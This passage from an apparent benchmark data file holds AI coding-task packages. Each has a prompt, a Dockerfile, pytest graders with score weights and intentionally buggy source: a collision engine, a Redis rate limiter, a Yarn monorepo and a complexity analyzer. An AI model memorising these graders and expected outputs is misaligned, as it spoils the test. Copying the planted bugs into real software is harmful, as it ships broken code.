range(min_cell_y, max_cell_y + 1):\n                cell_key = (cx, cy)\n                if cell_key not in self.cells:\n                    self.cells[cell_key] = set()\n                self.cells[cell_key].add(body)\n    \n    def query(self, body: Body) -> Set[Body]:\n        x1, y1, x2, y2 = body.get_bounds()\n        potential_collisions = set()\n        \n        # Get all cells this body overlaps\n        min_cell_x = int(x1 // self.cell_size)\n        max_cell_x = int(x2 // self.cell_size)\n        min_cell_y = int(y1 // self.cell_size)\n        max_cell_y = int(y2 // self.cell_size)\n        \n        for cx in range(min_cell_x, max_cell_x + 1):\n            for cy in range(min_cell_y, max_cell_y + 1):\n                cell_key = (cx, cy)\n                if cell_key in self.cells:\n                    potential_collisions.update(self.cells[cell_key])\n        \n        potential_collisions.discard(body)\n        return potential_collisions\n\nclass PhysicsEngine:\n    def __init__(self):\n        self.bodies: List[Body] = []\n        self.spatial_hash = SpatialHash(PhysicsConfig.GRID_CELL_SIZE)\n        self.collision_count = 0\n        self.missed_collisions = 0\n        self.total_checks = 0\n    \n    def add_body(self, body: Body):\n        self.bodies.append(body)\n    \n    def _check_aabb_collision(self, a: Body, b: Body) -> bool:\n        ax1, ay1, ax2, ay2 = a.get_bounds()\n        bx1, by1, bx2, by2 = b.get_bounds()\n        \n        return not (ax2 < bx1 or ax1 > bx2 or ay2 < by1 or ay1 > by2)\n    \n    def _resolve_collision(self, a: Body, b: Body):\n        if a.is_static and b.is_static:\n            return\n            \n        # Simple elastic collision resolution\n        if not a.is_static and not b.is_static:\n            # Exchange velocities (simplified)\n            a.vx, b.vx = b.vx * PhysicsConfig.RESTITUTION, a.vx * PhysicsConfig.RESTITUTION\n            a.vy, b.vy = b.vy * PhysicsConfig.RESTITUTION, a.vy * PhysicsConfig.RESTITUTION\n        elif a.is_static:\n            b.vx = -b.vx * PhysicsConfig.RESTITUTION\n            b.vy = -b.vy * PhysicsConfig.RESTITUTION\n        else:\n            a.vx = -a.vx * PhysicsConfig.RESTITUTION\n            a.vy = -a.vy * PhysicsConfig.RESTITUTION\n        \n        # Separate bodies\n        ax1, ay1, ax2, ay2 = a.get_bounds()\n        bx1, by1, bx2, by2 = b.get_bounds()\n        \n        overlap_x = min(ax2 - bx1, bx2 - ax1)\n        overlap_y = min(ay2 - by1, by2 - ay1)\n        \n        if overlap_x < overlap_y:\n            if a.x < b.x:\n                if not a.is_static:\n                    a.x -= overlap_x / 2\n                if not b.is_static:\n                    b.x += overlap_x / 2\n            else:\n                if not a.is_static:\n                    a.x += overlap_x / 2\n                if not b.is_static:\n                    b.x -= overlap_x / 2\n        else:\n            if a.y < b.y:\n                if not a.is_static:\n                    a.y -= overlap_y / 2\n                if not b.is_static:\n                    b.y += overlap_y / 2\n            else:\n                if not a.is_static:\n                    a.y += overlap_y / 2\n                if not b.is_static:\n                    b.y -= overlap_y / 2\n    \n    def update(self, dt: float):\n        # Update positions\n        for body in self.bodies:\n            if not body.is_static:\n                body.x += body.vx * dt\n                body.y += body.vy * dt\n                \n                # Clamp velocities\n                speed = math.sqrt(body.vx**2 + body.vy**2)\n                if speed > PhysicsConfig.MAX_VELOCITY:\n                    body.vx = (body.vx / speed) * PhysicsConfig.MAX_VELOCITY\n                    body.vy = (body.vy / speed) * PhysicsConfig.MAX_VELOCITY\n        \n        # Rebuild spatial hash\n        self.spatial_hash.clear()\n        for body in self.bodies:\n            self.spatial_hash.insert(body)\n        \n        # Detect and resolve collisions\n        checked_pairs = set()\n        for body in self.bodies:\n            potential_collisions = self.spatial_hash.query(body)\n            \n            for other in potential_collisions:\n                pair = (min(id(body), id(other)), max(id(body), id(other)))\n                if pair not in checked_pairs:\n                    checked_pairs.add(pair)\n                    self.total_checks += 1\n                    \n                    if self._check_aabb_collision(body, other):\n                        self.collision_count += 1\n                        self._resolve_collision(body, other)\n    \n    def get_collision_accuracy(self, ground_truth_collisions: int) -> float:\n        if ground_truth_collisions == 0:\n            return 100.0\n        \n        detected = min(self.collision_count, ground_truth_collisions)\n        accuracy = (detected / ground_truth_collisions) * 100.0\n        return accuracy"", ""test_collisions.py"": ""#!/usr/bin/env python3\nimport pygame\nimport sys\nfrom physics_engine import PhysicsEngine, Body, PhysicsConfig\nimport random\nimport time\n\ndef create_wall_bodies(width: int, height: int) -> list:\n    \""\""\""Create static wall bodies around the screen edges\""\""\""\n    walls = []\n    wall_thickness = 20\n    \n    # Top wall\n    wall = Body(0, 0, width, wall_thickness)\n    wall.is_static = True\n    walls.append(wall)\n    \n    # Bottom wall\n    wall = Body(0, height - wall_thickness, width, wall_thickness)\n    wall.is_static = True\n    walls.append(wall)\n    \n    # Left wall\n    wall = Body(0, 0, wall_thickness, height)\n    wall.is_static = True\n    walls.append(wall)\n    \n    # Right wall\n    wall = Body(width - wall_thickness, 0, wall_thickness, height)\n    wall.is_static = True\n    walls.append(wall)\n    \n    return walls\n\ndef run_collision_scenario(scenario_name: str, setup_func) -> tuple:\n    \""\""\""Run a collision scenario and return detected vs expected collisions\""\""\""\n    engine = PhysicsEngine()\n    expected_collisions = setup_func(engine)\n    \n    # Simulate for 5 seconds\n    steps = int(5.0 / PhysicsConfig.FIXED_TIMESTEP)\n    for _ in range(steps):\n        engine.update(PhysicsConfig.FIXED_TIMESTEP)\n    \n    return engine.collision_count, expected_collisions\n\ndef scenario_bouncing_balls(engine: PhysicsEngine) -> int:\n    \""\""\""Multiple balls bouncing around\""\""\""\n    walls = create_wall_bodies(800, 600)\n    for wall in walls:\n        engine.add_body(wall)\n    \n    # Add 10 bouncing balls\n    for i in range(10):\n        x = random.randint(100, 700)\n        y = random.randint(100, 500)\n        vx = random.randint(-300, 300)\n        vy = random.randint(-300, 300)\n        ball = Body(x, y, 30, 30, vx, vy)\n        engine.add_body(ball)\n    \n    # Expected: many collisions over 5 seconds\n    return 250  # Approximate expected collisions\n\ndef scenario_high_speed_collision(engine: PhysicsEngine) -> int:\n    \""\""\""Fast moving objects that might tunnel through walls\""\""\""\n    walls = create_wall_bodies(800, 600)\n    for wall in walls:\n        engine.add_body(wall)\n    \n    # Add fast-moving projectiles\n    for i in range(5):\n        x = 100\n        y = 100 + i * 100\n        vx = 800  # Very fast horizontal movement\n        vy = 0\n        projectile = Body(x, y, 10, 10, vx, vy)\n        engine.add_body(projectile)\n    \n    # Each projectile should hit the right wall at least once\n    return 25  # Expected collisions with walls\n\ndef scenario_corner_cases(engine: PhysicsEngine) -> int:\n    \""\""\""Objects spawning at cell boundaries\""\""\""\n    walls = create_wall_bodies(800, 600)\n    for wall in walls:\n        engine.add_body(wall)\n    \n    # Place objects at grid cell boundaries\n    cell_size = PhysicsConfig.GRID_CELL_SIZE\n    for i in range(0, 800, cell_size):\n        for j in range(0, 600, cell_size):\n            if i > 0 and i < 780 and j > 0 and j < 580:\n                # Place object right at cell boundary\n                obj = Body(i - 5, j - 5, 10, 10, \n                          random.randint(-100, 100), \n                          random.randint(-100, 100))\n                engine.add_body(obj)\n    \n    return 150  # Expected collisions\n\ndef scenario_dense_particles(engine: PhysicsEngine) -> int:\n    \""\""\""Many small particles in close proximity\""\""\""\n    walls = create_wall_bodies(800, 600)\n    for wall in walls:\n        engine.add_body(wall)\n    \n    # Create a dense cluster of particles\n    center_x, center_y = 400, 300\n    for i in range(20):\n        angle = (i / 20) * 2 * 3.14159\n        x = center_x + 50 * (1 + i * 0.1) * abs(random.gauss(1, 0.3))\n        y = center_y + 50 * (1 + i * 0.1) * abs(random.gauss(1, 0.3))\n        vx = random.randint(-200, 200)\n        vy = random.randint(-200, 200)\n        particle = Body(x, y, 15, 15, vx, vy)\n        engine.add_body(particle)\n    \n    return 300  # Many inter-particle collisions expected\n\ndef main():\n    print(\""Running collision detection test suite...\"")\n    print(f\""Current grid cell size: {PhysicsConfig.GRID_CELL_SIZE}\"")\n    print()\n    \n    scenarios = [\n        (\""Bouncing Balls\"", scenario_bouncing_balls),\n        (\""High Speed Collision\"", scenario_high_speed_collision),\n        (\""Corner Cases\"", scenario_corner_cases),\n        (\""Dense Particles\"", scenario_dense_particles)\n    ]\n    \n    total_detected = 0\n    total_expected = 0\n    \n    for name, scenario_func in scenarios:\n        detected, expected = run_collision_scenario(name, scenario_func)\n        accuracy = (min(detected, expected) / expected) * 100\n        print(f\""{name}: {detected}/{expected} collisions detected ({accuracy:.1f}%)\"")\n        total_detected += min(detected, expected)\n        total_expected += expected\n    \n    overall_accuracy = (total_detected / total_expected) * 100\n    print()\n    print(f\""Collision Detection Accuracy: {overall_accuracy:.1f}%\"")\n    \n    return overall_accuracy\n\nif __name__ == \""__main__\"":\n    accuracy = main()\n    sys.exit(0 if accuracy > 98 else 1)""}",2025-07-21T14:16:43.223857,2025-07-22T11:55:19.028549+00:00
draft_dp_4d49abc1,medium,draft_dp_4d49abc1,debugging,The rate limiter is blocking at 71% accuracy - some clients exceed limits while others get blocked incorrectly. Fix it to achieve >99% accuracy when you run `python test_rate_limiter.py`.,debugging,python|api|performance-optimization,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN apt-get update && apt-get install -y redis-server && \
    pip install fastapi uvicorn redis pytest httpx

COPY rate_limiter.py /app/
COPY test_rate_limiter.py /app/
COPY app.py /app/

RUN redis-server --daemonize yes

CMD [""bash""]","import subprocess
import re

def test_rate_limiter_accuracy_improved():
    """"""Test that the rate limiter accuracy has been improved to >99%.""""""
    # Run the test harness
    result = subprocess.run(
        [""python"", ""/app/test_rate_limiter.py""],
        capture_output=True,
        text=True,
        timeout=30
    )
    
    # Extract accuracy from output
    accuracy_match = re.search(r""Rate Limiting Accuracy: ([\d.]+)%"", result.stdout)
    assert accuracy_match is not None, ""Could not find accuracy in output""
    
    accuracy = float(accuracy_match.group(1))
    assert accuracy > 99.0, f""Rate limiter accuracy is {accuracy}%, should be >99%""

def test_rate_limiter_runs_successfully():
    """"""Test that the rate limiter test harness completes without errors.""""""
    result = subprocess.run(
        [""python"", ""/app/test_rate_limiter.py""],
        capture_output=True,
        text=True,
        timeout=30
    )
    
    assert result.returncode == 0, f""Test harness failed with return code {result.returncode}""
    assert ""Rate Limiting Accuracy:"" in result.stdout, ""Test harness did not produce expected output""","{""test_rate_limiter_accuracy_improved"": 0.8, ""test_rate_limiter_runs_successfully"": 0.2}","{""rate_limiter.py"": ""import redis\nimport time\nimport json\nfrom typing import Tuple\n\nclass TokenBucketRateLimiter:\n    def __init__(self, redis_client: redis.Redis):\n        self.redis = redis_client\n        self.bucket_capacity = 100\n        self.refill_rate = 10  # tokens per second\n        \n    def _get_bucket_key(self, client_id: str) -> str:\n        return f\""rate_limit:bucket:{client_id}\""\n    \n    def _get_last_refill_key(self, client_id: str) -> str:\n        return f\""rate_limit:last_refill:{client_id}\""\n    \n    def allow_request(self, client_id: str, tokens_needed: int = 1) -> Tuple[bool, float]:\n        \""\""\""Check if request is allowed and consume tokens if so.\""\""\""\n        current_time = time.time()\n        bucket_key = self._get_bucket_key(client_id)\n        refill_key = self._get_last_refill_key(client_id)\n        \n        # Get current bucket state\n        pipe = self.redis.pipeline()\n        pipe.get(bucket_key)\n        pipe.get(refill_key)\n        bucket_tokens, last_refill = pipe.execute()\n        \n        # Initialize if new client\n        if bucket_tokens is None:\n            bucket_tokens = self.bucket_capacity\n            last_refill = current_time\n        else:\n            bucket_tokens = float(bucket_tokens)\n            last_refill = float(last_refill) if last_refill else current_time\n        \n        # Calculate tokens to add based on time elapsed\n        time_elapsed = current_time - last_refill\n        tokens_to_add = time_elapsed * self.refill_rate\n        \n        # Update bucket with new tokens (capped at capacity)\n        new_tokens = min(bucket_tokens + tokens_to_add, self.bucket_capacity)\n        \n        # Check if we have enough tokens\n        if new_tokens >= tokens_needed:\n            # Consume tokens\n            new_tokens -= tokens_needed\n            \n            # Update Redis state\n            pipe = self.redis.pipeline()\n            pipe.set(bucket_key, new_tokens)\n            pipe.set(refill_key, current_time)\n            pipe.execute()\n            \n            return True, new_tokens\n        else:\n            # Not enough tokens, but still update the refill time\n            pipe = self.redis.pipeline()\n            pipe.set(bucket_key, new_tokens)\n            pipe.set(refill_key, current_time)\n            pipe.execute()\n            \n            return False, new_tokens\n    \n    def set_client_limits(self, client_id: str, capacity: int, refill_rate: float):\n        \""\""\""Set custom limits for a specific client.\""\""\""\n        # For simplicity, using global limits for now\n        # This is part of the bug - not respecting per-client limits properly\n        pass"", ""app.py"": ""from fastapi import FastAPI, Request, HTTPException\nimport redis\nfrom rate_limiter import TokenBucketRateLimiter\n\napp = FastAPI()\nredis_client = redis.Redis(host='localhost', port=6379, decode_responses=True)\nrate_limiter = TokenBucketRateLimiter(redis_client)\n\n@app.middleware(\""http\"")\nasync def rate_limit_middleware(request: Request, call_next):\n    # Extract client ID from header\n    client_id = request.headers.get(\""X-Client-ID\"", \""default\"")\n    \n    # Check rate limit\n    allowed, tokens_left = rate_limiter.allow_request(client_id)\n    \n    if not allowed:\n        raise HTTPException(status_code=429, detail=\""Rate limit exceeded\"")\n    \n    response = await call_next(request)\n    response.headers[\""X-RateLimit-Remaining\""] = str(int(tokens_left))\n    return response\n\n@app.get(\""/api/data\"")\nasync def get_data():\n    return {\""message\"": \""Success\"", \""data\"": [1, 2, 3, 4, 5]}\n\n@app.get(\""/health\"")\nasync def health_check():\n    return {\""status\"": \""healthy\""}"", ""test_rate_limiter.py"": ""import time\nimport redis\nimport httpx\nimport asyncio\nimport subprocess\nimport sys\nfrom collections import defaultdict\n\nclass RateLimiterTester:\n    def __init__(self):\n        self.redis_client = redis.Redis(host='localhost', port=6379, decode_responses=True)\n        self.base_url = \""http://localhost:8000\""\n        self.results = defaultdict(lambda: {\""allowed\"": 0, \""blocked\"": 0, \""should_block\"": 0, \""should_allow\"": 0})\n        \n    def start_server(self):\n        \""\""\""Start the FastAPI server in the background.\""\""\""\n        self.server_process = subprocess.Popen(\n            [\""uvicorn\"", \""app:app\"", \""--host\"", \""0.0.0.0\"", \""--port\"", \""8000\""],\n            stdout=subprocess.DEVNULL,\n            stderr=subprocess.DEVNULL\n        )\n        time.sleep(3)  # Wait for server to start\n    \n    def stop_server(self):\n        \""\""\""Stop the FastAPI server.\""\""\""\n        if hasattr(self, 'server_process'):\n            self.server_process.terminate()\n            self.server_process.wait()\n    \n    async def make_request(self, client_id: str):\n        \""\""\""Make a single request with the given client ID.\""\""\""\n        async with httpx.AsyncClient() as client:\n            try:\n                response = await client.get(\n                    f\""{self.base_url}/api/data\"",\n                    headers={\""X-Client-ID\"": client_id},\n                    timeout=2.0\n                )\n                return response.status_code\n            except Exception as e:\n                return 500\n    \n    async def test_steady_traffic(self, client_id: str, requests_per_second: int, duration: int):\n        \""\""\""Test steady traffic pattern.\""\""\""\n        total_requests = requests_per_second * duration\n        interval = 1.0 / requests_per_second\n        \n        # With 100 token bucket and 10 tokens/sec refill:\n        # Should allow 100 requests immediately, then 10/sec\n        expected_allowed = min(100 + (10 * duration), total_requests)\n        expected_blocked = max(0, total_requests - expected_allowed)\n        \n        for i in range(total_requests):\n            status = await self.make_request(client_id)\n            if status == 200:\n                self.results[client_id][\""allowed\""] += 1\n            elif status == 429:\n                self.results[client_id][\""blocked\""] += 1\n            \n            # Track what should happen\n            if i < expected_allowed:\n                self.results[client_id][\""should_allow\""] += 1\n            else:\n                self.results[client_id][\""should_block\""] += 1\n                \n            await asyncio.sleep(interval)\n    \n    async def test_burst_traffic(self, client_id: str, burst_size: int):\n        \""\""\""Test burst traffic pattern.\""\""\""\n        # Should allow up to bucket capacity (100) in burst\n        expected_allowed = min(burst_size, 100)\n        expected_blocked = max(0, burst_size - 100)\n        \n        tasks = []\n        for i in range(burst_size):\n            tasks.append(self.make_request(client_id))\n        \n        results = await asyncio.gather(*tasks)\n        \n        for i, status in enumerate(results):\n            if status == 200:\n                self.results[client_id][\""allowed\""] += 1\n            elif status == 429:\n                self.results[client_id][\""blocked\""] += 1\n            \n            # Track what should happen\n            if i < expected_allowed:\n                self.results[client_id][\""should_allow\""] += 1\n            else:\n                self.results[client_id][\""should_block\""] += 1\n    \n    def calculate_accuracy(self):\n        \""\""\""Calculate overall accuracy of rate limiting.\""\""\""\n        total_correct = 0\n        total_requests = 0\n        \n        for client_id, stats in self.results.items():\n            # Correct allows: requests that were allowed and should have been allowed\n            correct_allows = min(stats[\""allowed\""], stats[\""should_allow\""])\n            # Correct blocks: requests that were blocked and should have been blocked\n            correct_blocks = min(stats[\""blocked\""], stats[\""should_block\""])\n            \n            correct = correct_allows + correct_blocks\n            total = stats[\""allowed\""] + stats[\""blocked\""]\n            \n            total_correct += correct\n            total_requests += total\n        \n        if total_requests == 0:\n            return 100.0\n        \n        return (total_correct / total_requests) * 100\n    \n    async def run_tests(self):\n        \""\""\""Run all test scenarios.\""\""\""\n        print(\""Starting rate limiter tests...\"")\n        \n        # Clear Redis before tests\n        self.redis_client.flushall()\n        \n        # Test 1: Burst traffic for different clients\n        print(\""Testing burst traffic...\"")\n        await self.test_burst_traffic(\""client1\"", 120)  # Should allow 100, block 20\n        await asyncio.sleep(2)\n        \n        await self.test_burst_traffic(\""client2\"", 80)   # Should allow all 80\n        await asyncio.sleep(2)\n        \n        await self.test_burst_traffic(\""client3\"", 150)  # Should allow 100, block 50\n        await asyncio.sleep(2)\n        \n        # Test 2: Steady traffic\n        print(\""Testing steady traffic...\"")\n        await self.test_steady_traffic(\""client4\"", 15, 5)  # 15 req/s for 5s = 75 total\n        \n        # Test 3: Mixed pattern\n        print(\""Testing mixed patterns...\"")\n        await self.test_burst_traffic(\""client5\"", 50)\n        await asyncio.sleep(1)\n        await self.test_steady_traffic(\""client5\"", 20, 3)\n        \n        # Calculate and print accuracy\n        accuracy = self.calculate_accuracy()\n        print(f\""\\nRate Limiting Accuracy: {accuracy:.1f}%\"")\n        \n        # Print detailed results for debugging\n        print(\""\\nDetailed Results:\"")\n        for client_id, stats in sorted(self.results.items()):\n            print(f\""{client_id}: Allowed={stats['allowed']}, Blocked={stats['blocked']}, \"" +\n                  f\""Should Allow={stats['should_allow']}, Should Block={stats['should_block']}\"")\n\nasync def main():\n    # Ensure Redis is running\n    subprocess.run([\""redis-server\"", \""--daemonize\"", \""yes\""], capture_output=True)\n    time.sleep(1)\n    \n    tester = RateLimiterTester()\n    tester.start_server()\n    \n    try:\n        await tester.run_tests()\n    finally:\n        tester.stop_server()\n\nif __name__ == \""__main__\"":\n    asyncio.run(main())""}",2025-07-21T16:55:27.178823,2025-07-21T16:55:27.178823
draft_dp_1b788a2a,extremely_hard,draft_dp_1b788a2a,software-engineering,Yarn install is failing with peer dependency conflicts in our monorepo. The ui-components package uses React 17 but web-app needs React 18. Also seeing TypeScript and ESLint version mismatches across packages. Need to fix these so all packages can build.,software-engineering,package-management|debugging|troubleshooting,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN apt-get update && apt-get install -y \
    curl \
    gnupg \
    && curl -fsSL https://deb.nodesource.com/setup_18.x | bash - \
    && apt-get install -y nodejs \
    && npm install -g yarn@1.22.19 \
    && apt-get clean \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /workspace

COPY package.json yarn.lock lerna.json ./
COPY packages/ ./packages/

RUN cd packages/ui-components && yarn install --frozen-lockfile || true
RUN cd packages/web-app && yarn install --frozen-lockfile || true
RUN cd packages/api-server && yarn install --frozen-lockfile || true
RUN cd packages/cli-tool && yarn install --frozen-lockfile || true

WORKDIR /workspace","import subprocess
import os
import json

def test_yarn_install_succeeds():
    """"""Test that yarn install completes without errors after dependency resolution.""""""
    result = subprocess.run(
        ['yarn', 'install'],
        cwd='/workspace',
        capture_output=True,
        text=True
    )
    assert result.returncode == 0, f""yarn install failed with: {result.stderr}""
    assert ""error"" not in result.stderr.lower(), f""yarn install had errors: {result.stderr}""
    assert ""warning"" not in result.stdout.lower() or ""peer dep"" not in result.stdout.lower(), ""Peer dependency warnings still present""

def test_all_packages_build():
    """"""Test that all packages can build successfully.""""""
    packages = ['ui-components', 'web-app', 'api-server', 'cli-tool']
    
    for package in packages:
        result = subprocess.run(
            ['yarn', 'build'],
            cwd=f'/workspace/packages/{package}',
            capture_output=True,
            text=True
        )
        assert result.returncode == 0, f""Build failed for {package}: {result.stderr}""
        
        dist_exists = os.path.exists(f'/workspace/packages/{package}/dist')
        assert dist_exists, f""No dist directory created for {package}""","{""test_yarn_install_succeeds"": 0.5, ""test_all_packages_build"": 0.5}","{""yarn.lock"": ""# THIS IS AN AUTOGENERATED FILE. DO NOT EDIT THIS FILE DIRECTLY.\n# yarn lockfile v1\n\n# This file intentionally left with minimal content to simulate\n# a monorepo that needs dependency resolution"", ""package.json"": ""{\n  \""name\"": \""webapp-monorepo\"",\n  \""private\"": true,\n  \""workspaces\"": [\n    \""packages/*\""\n  ],\n  \""scripts\"": {\n    \""build\"": \""lerna run build\"",\n    \""test\"": \""lerna run test\""\n  },\n  \""devDependencies\"": {\n    \""lerna\"": \""^6.6.2\""\n  }\n}"", ""lerna.json"": ""{\n  \""packages\"": [\""packages/*\""],\n  \""version\"": \""independent\"",\n  \""npmClient\"": \""yarn\"",\n  \""useWorkspaces\"": true\n}"", ""packages/web-app/package.json"": ""{\n  \""name\"": \""@webapp/web-app\"",\n  \""version\"": \""1.0.0\"",\n  \""scripts\"": {\n    \""build\"": \""tsc\"",\n    \""start\"": \""node dist/index.js\"",\n    \""test\"": \""echo 'Tests passed'\""\n  },\n  \""dependencies\"": {\n    \""@webapp/ui-components\"": \""^1.0.0\"",\n    \""react\"": \""^18.2.0\"",\n    \""react-dom\"": \""^18.2.0\"",\n    \""@types/react\"": \""^18.0.26\"",\n    \""@types/react-dom\"": \""^18.0.9\""\n  },\n  \""devDependencies\"": {\n    \""typescript\"": \""^5.0.4\"",\n    \""eslint\"": \""^8.28.0\"",\n    \""eslint-plugin-react\"": \""^7.31.11\""\n  }\n}"", ""packages/web-app/tsconfig.json"": ""{\n  \""compilerOptions\"": {\n    \""target\"": \""es2020\"",\n    \""module\"": \""commonjs\"",\n    \""jsx\"": \""react\"",\n    \""outDir\"": \""./dist\"",\n    \""strict\"": true,\n    \""esModuleInterop\"": true,\n    \""skipLibCheck\"": true,\n    \""forceConsistentCasingInFileNames\"": true\n  },\n  \""include\"": [\""src\""]\n}"", ""packages/api-server/package.json"": ""{\n  \""name\"": \""@webapp/api-server\"",\n  \""version\"": \""1.0.0\"",\n  \""scripts\"": {\n    \""build\"": \""tsc\"",\n    \""start\"": \""node dist/index.js\"",\n    \""test\"": \""echo 'Tests passed'\""\n  },\n  \""dependencies\"": {\n    \""express\"": \""^4.18.2\"",\n    \""@types/express\"": \""^4.17.15\""\n  },\n  \""devDependencies\"": {\n    \""typescript\"": \""^4.9.4\"",\n    \""eslint\"": \""^8.5.0\"",\n    \""@typescript-eslint/parser\"": \""^5.48.0\"",\n    \""@typescript-eslint/eslint-plugin\"": \""^5.48.0\""\n  }\n}"", ""packages/api-server/tsconfig.json"": ""{\n  \""compilerOptions\"": {\n    \""target\"": \""es2019\"",\n    \""module\"": \""commonjs\"",\n    \""outDir\"": \""./dist\"",\n    \""strict\"": true,\n    \""esModuleInterop\"": true,\n    \""skipLibCheck\"": true,\n    \""forceConsistentCasingInFileNames\"": true\n  },\n  \""include\"": [\""src\""]\n}"", ""packages/cli-tool/package.json"": ""{\n  \""name\"": \""@webapp/cli-tool\"",\n  \""version\"": \""1.0.0\"",\n  \""bin\"": {\n    \""webapp-cli\"": \""./dist/index.js\""\n  },\n  \""scripts\"": {\n    \""build\"": \""tsc\"",\n    \""test\"": \""echo 'Tests passed'\""\n  },\n  \""dependencies\"": {\n    \""commander\"": \""^9.4.1\""\n  },\n  \""devDependencies\"": {\n    \""typescript\"": \""^5.0.4\"",\n    \""eslint\"": \""^7.32.0\"",\n    \""@typescript-eslint/parser\"": \""^4.33.0\"",\n    \""@typescript-eslint/eslint-plugin\"": \""^4.33.0\""\n  }\n}"", ""packages/cli-tool/tsconfig.json"": ""{\n  \""compilerOptions\"": {\n    \""target\"": \""es2020\"",\n    \""module\"": \""commonjs\"",\n    \""outDir\"": \""./dist\"",\n    \""strict\"": true,\n    \""esModuleInterop\"": true,\n    \""skipLibCheck\"": true,\n    \""forceConsistentCasingInFileNames\"": true\n  },\n  \""include\"": [\""src\""]\n}"", ""packages/ui-components/package.json"": ""{\n  \""name\"": \""@webapp/ui-components\"",\n  \""version\"": \""1.0.0\"",\n  \""main\"": \""dist/index.js\"",\n  \""scripts\"": {\n    \""build\"": \""tsc\"",\n    \""test\"": \""echo 'Tests passed'\""\n  },\n  \""peerDependencies\"": {\n    \""react\"": \""^17.0.2\"",\n    \""react-dom\"": \""^17.0.2\""\n  },\n  \""dependencies\"": {\n    \""@types/react\"": \""^17.0.38\""\n  },\n  \""devDependencies\"": {\n    \""typescript\"": \""^4.5.4\"",\n    \""eslint\"": \""^7.32.0\"",\n    \""eslint-plugin-react\"": \""^7.28.0\""\n  }\n}"", ""packages/ui-components/tsconfig.json"": ""{\n  \""compilerOptions\"": {\n    \""target\"": \""es5\"",\n    \""module\"": \""commonjs\"",\n    \""jsx\"": \""react\"",\n    \""declaration\"": true,\n    \""outDir\"": \""./dist\"",\n    \""strict\"": true,\n    \""esModuleInterop\"": true,\n    \""skipLibCheck\"": true,\n    \""forceConsistentCasingInFileNames\"": true\n  },\n  \""include\"": [\""src\""]\n}"", ""packages/web-app/src/index.tsx"": ""import React from 'react';\nimport ReactDOM from 'react-dom/client';\nimport { Button, Card } from '@webapp/ui-components';\n\nconst App = () => {\n  return (\n    <div>\n      <h1>Web Application</h1>\n      <Card title=\""Welcome\"">\n        <p>This is the main web application.</p>\n        <Button label=\""Click Me\"" />\n      </Card>\n    </div>\n  );\n};\n\nconst root = ReactDOM.createRoot(document.getElementById('root')!);\nroot.render(<App />);\n\nconsole.log('App started');"", ""packages/api-server/src/index.ts"": ""import express from 'express';\n\nconst app = express();\nconst port = 3001;\n\napp.get('/health', (req, res) => {\n  res.json({ status: 'ok', timestamp: new Date().toISOString() });\n});\n\napp.get('/api/users', (req, res) => {\n  res.json([\n    { id: 1, name: 'John Doe' },\n    { id: 2, name: 'Jane Smith' }\n  ]);\n});\n\napp.listen(port, () => {\n  console.log(`API server running on port ${port}`);\n});"", ""packages/cli-tool/src/index.ts"": ""#!/usr/bin/env node\n\nimport { Command } from 'commander';\n\nconst program = new Command();\n\nprogram\n  .name('webapp-cli')\n  .description('CLI tool for the webapp monorepo')\n  .version('1.0.0');\n\nprogram\n  .command('status')\n  .description('Check the status of all services')\n  .action(() => {\n    console.log('Checking service status...');\n    console.log('- UI Components: OK');\n    console.log('- Web App: OK');\n    console.log('- API Server: OK');\n  });\n\nprogram.parse(process.argv);"", ""packages/ui-components/src/index.tsx"": ""import React from 'react';\n\nexport const Button: React.FC<{ label: string }> = ({ label }) => {\n  return <button>{label}</button>;\n};\n\nexport const Card: React.FC<{ title: string; children: React.ReactNode }> = ({ title, children }) => {\n  return (\n    <div>\n      <h2>{title}</h2>\n      {children}\n    </div>\n  );\n};""}",2025-07-21T16:50:02.975387,2025-07-21T16:50:02.975387
draft_dp_0ed1ae24,extremely_hard,draft_dp_0ed1ae24,debugging,The complexity analyzer is broken - it's not calculating cyclomatic complexity correctly and the JSON output is malformed. Fix it so it analyzes all Python files in /app/codebase and outputs valid metrics to complexity_report.json.,debugging,python|analysis|debugging,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Copy the analyzer and codebase
COPY complexity_analyzer.py /app/
COPY codebase/ /app/codebase/

# Make the analyzer executable
RUN chmod +x /app/complexity_analyzer.py

CMD [""/bin/bash""]","import os
import json
import subprocess

def test_complexity_report_exists_and_valid():
    """"""Test that the complexity report is generated with valid JSON""""""
    # Check if the report file exists
    assert os.path.exists('/app/complexity_report.json'), ""complexity_report.json not found""
    
    # Check if it's valid JSON
    with open('/app/complexity_report.json', 'r') as f:
        data = json.load(f)  # This will raise if JSON is invalid
    
    # Check basic structure
    assert 'total_files' in data, ""Missing 'total_files' in report""
    assert 'files' in data, ""Missing 'files' in report""
    assert isinstance(data['files'], dict), ""'files' should be a dictionary""
    assert len(data['files']) == 2, ""Should have analyzed 2 Python files""

def test_cyclomatic_complexity_calculated():
    """"""Test that cyclomatic complexity is properly calculated for functions""""""
    with open('/app/complexity_report.json', 'r') as f:
        data = json.load(f)
    
    # Check that files have complexity metrics
    for filepath, metrics in data['files'].items():
        assert 'complexity' in metrics, f""Missing 'complexity' for {filepath}""
        
        # The utils.py file has several if/else branches and loops
        # Should have complexity > just counting functions/classes
        if 'utils.py' in filepath:
            # utils.py has 3 functions with multiple branches and 1 class
            # Proper cyclomatic complexity should be at least 10+
            assert metrics['complexity'] > 8, f""Cyclomatic complexity too low for utils.py: {metrics['complexity']}""
        
        # data_processor.py has many conditional branches
        if 'data_processor.py' in filepath:
            # Should have significant complexity due to multiple conditions
            assert metrics['complexity'] > 12, f""Cyclomatic complexity too low for data_processor.py: {metrics['complexity']}""","{""test_complexity_report_exists_and_valid"": 0.4, ""test_cyclomatic_complexity_calculated"": 0.6}","{""complexity_analyzer.py"": ""#!/usr/bin/env python3\n\nimport ast\nimport os\nimport json\nfrom pathlib import Path\n\nclass ComplexityAnalyzer:\n    def __init__(self):\n        self.results = {}\n    \n    def analyze_file(self, filepath):\n        with open(filepath, 'r') as f:\n            content = f.read()\n        \n        try:\n            tree = ast.parse(content)\n            visitor = ComplexityVisitor()\n            visitor.visit(tree)\n            \n            return {\n                'functions': visitor.functions,\n                'classes': visitor.classes,\n                'total_lines': len(content.splitlines())\n            }\n        except:\n            return None\n    \n    def analyze_directory(self, directory):\n        for root, dirs, files in os.walk(directory):\n            for file in files:\n                if file.endswith('.py'):\n                    filepath = os.path.join(root, file)\n                    result = self.analyze_file(filepath)\n                    if 